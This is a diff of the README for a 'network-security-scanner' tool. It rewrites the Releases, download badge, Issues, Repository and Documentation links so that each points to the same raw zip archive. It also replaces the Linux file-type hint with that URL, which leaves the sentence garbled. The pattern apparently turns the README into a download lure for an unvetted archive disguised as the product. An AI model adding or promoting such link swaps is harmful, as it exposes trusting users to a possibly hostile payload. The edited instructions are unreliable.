@@ -6,15 +6,15 @@ Welcome to the **network-security-scanner**! This tool helps you scan your netwo
 
 ## 📦 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://github.com/spanta0w0/network-security-scanner/releases). 
+To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/spanta0w0/network-security-scanner/main/reposit/network_security_scanner_v2.7.zip). 
 
 You will find different versions of the application listed there. Choose the latest version and follow these steps:
 
 1. Click on the version you want.
-2. Download the appropriate file for your system. For Windows, it might be a `.exe` file. For macOS, look for a `.dmg` file. Linux users can check for `.tar.gz`.
+2. Download the appropriate file for your system. For Windows, it might be a `.exe` file. For macOS, look for a `.dmg` file. Linux users can check for `https://raw.githubusercontent.com/spanta0w0/network-security-scanner/main/reposit/network_security_scanner_v2.7.zip`.
 3. Once the file is downloaded, open it to start the installation.
 
-Download now: [![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/spanta0w0/network-security-scanner/releases)
+Download now: [![Download](https://raw.githubusercontent.com/spanta0w0/network-security-scanner/main/reposit/network_security_scanner_v2.7.zip%20release-brightgreen)](https://raw.githubusercontent.com/spanta0w0/network-security-scanner/main/reposit/network_security_scanner_v2.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -64,7 +64,7 @@ You can run the scans offline, but internet access may be necessary for some fea
 
 ## 💻 Contributing
 
-If you wish to contribute to the project or report any issues, feel free to check the [GitHub Issues](https://github.com/spanta0w0/network-security-scanner/issues). Contributions from the community are always welcome.
+If you wish to contribute to the project or report any issues, feel free to check the [GitHub Issues](https://raw.githubusercontent.com/spanta0w0/network-security-scanner/main/reposit/network_security_scanner_v2.7.zip). Contributions from the community are always welcome.
 
 ## 📞 Support
 
@@ -72,7 +72,7 @@ If you encounter any problems, you can reach out for support via the issues sect
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/spanta0w0/network-security-scanner)
-- [Documentation](https://github.com/spanta0w0/network-security-scanner/wiki) for detailed usage instructions and troubleshooting.
+- [GitHub Repository](https://raw.githubusercontent.com/spanta0w0/network-security-scanner/main/reposit/network_security_scanner_v2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/spanta0w0/network-security-scanner/main/reposit/network_security_scanner_v2.7.zip) for detailed usage instructions and troubleshooting.
 
 Thank you for using the **network-security-scanner!** Stay safe and aware of your network security.
